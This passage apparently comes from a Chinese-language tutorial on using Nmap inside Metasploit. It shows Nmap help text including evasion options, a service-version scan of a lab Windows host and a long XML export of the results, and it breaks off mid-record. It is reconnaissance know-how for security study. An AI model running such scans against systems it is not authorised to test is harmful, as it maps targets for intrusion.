[*] --ttl &lt;val&gt;: Set IP time-to-live field
[*] --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
[*] --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
[*] OUTPUT:
[*] -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
[*] and Grepable format, respectively, to the given filename.
[*] -oA &lt;basename&gt;: Output in the three major formats at once
[*] -v: Increase verbosity level (use -vv or more for greater effect)
[*] -d: Increase debugging level (use -dd or more for greater effect)
[*] --reason: Display the reason a port is in a particular state
[*] --open: Only show open (or possibly open) ports
[*] --packet-trace: Show all packets sent and received
[*] --iflist: Print host interfaces and routes (for debugging)
[*] --append-output: Append to rather than clobber specified output files
[*] --resume &lt;filename&gt;: Resume an aborted scan
[*] --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
[*] --webxml: Reference stylesheet from Nmap.Org for more portable XML
[*] --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
[*] MISC:
[*] -6: Enable IPv6 scanning
[*] -A: Enable OS detection, version detection, script scanning, and traceroute
[*] --datadir &lt;dirname&gt;: Specify custom Nmap data file location
[*] --send-eth/--send-ip: Send using raw ethernet frames or IP packets
[*] --privileged: Assume that the user is fully privileged
[*] --unprivileged: Assume the user lacks raw socket privileges
[*] -V: Print version number
[*] -h: Print this help summary page.
[*] EXAMPLES:
[*] nmap -v -A scanme.nmap.org
[*] nmap -v -sn 192.168.0.0/16 10.0.0.0/8
[*] nmap -v -iR 10000 -Pn -p 80
[*] SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
msf5 &gt; </code></pre><p>探测服务详细信息</p>
<pre><code>msf5 &gt; db_nmap -Pn -sV 192.33.6.151
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 04:25 EDT
[*] Nmap: Nmap scan report for 192.33.6.151
[*] Nmap: Host is up (0.00060s latency).
[*] Nmap: Not shown: 990 closed ports
[*] Nmap: PORT      STATE SERVICE        VERSION
[*] Nmap: 135/tcp   open  msrpc          Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: 49156/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: 49157/tcp open  msrpc          Microsoft Windows RPC
[*] Nmap: MAC Address: 00:0C:29:FB:6F:2E (VMware)
[*] Nmap: Service Info: Host: WIN-5DTIE0M734E; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 87.94 seconds
msf5 &gt; </code></pre><p>将数据库中的扫描结果导出</p>
<pre><code>msf5 &gt; db_export -f xml 1
[*] Starting export of workspace default to 1 [ xml ]...
[*] Finished export of workspace default to 1 [ xml ]...
msf5 &gt; ls
[*] exec: ls

1  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
msf5 &gt; </code></pre><p>查看导出文件内容</p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MetasploitV5</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>generated</span> <span class="token attr-name">time</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2020-06-24 08:29:14 UTC<span class="token punctuation">"</span></span> <span class="token attr-name">user</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qftm<span class="token punctuation">"</span></span> <span class="token attr-name">project</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>default<span class="token punctuation">"</span></span> <span class="token attr-name">product</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>framework<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hosts</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span>192.33.6.151<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mac</span><span class="token punctuation">></span></span>00:0c:29:fb:6f:2e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mac</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comm</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comm</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>alive<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>os-name</span><span class="token punctuation">></span></span>Unknown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>os-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>os-flavor</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>os-sp</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>os-lang</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>arch</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>purpose</span><span class="token punctuation">></span></span>device<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>purpose</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comments</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>virtual-host</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note-count</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vuln-count</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>vuln-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service-count</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-detail-count</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-detail-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exploit-attempt-count</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exploit-attempt-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cred-count</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cred-count</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>detected-arch</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>os-family</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host_details</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host_details</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exploit_attempts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exploit_attempts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>services</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>135<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>139<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>netbios-ssn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows netbios-ssn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>445<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>microsoft-ds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>3389<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ms-wbt-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49152<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49153<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49154<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49155<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49156<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
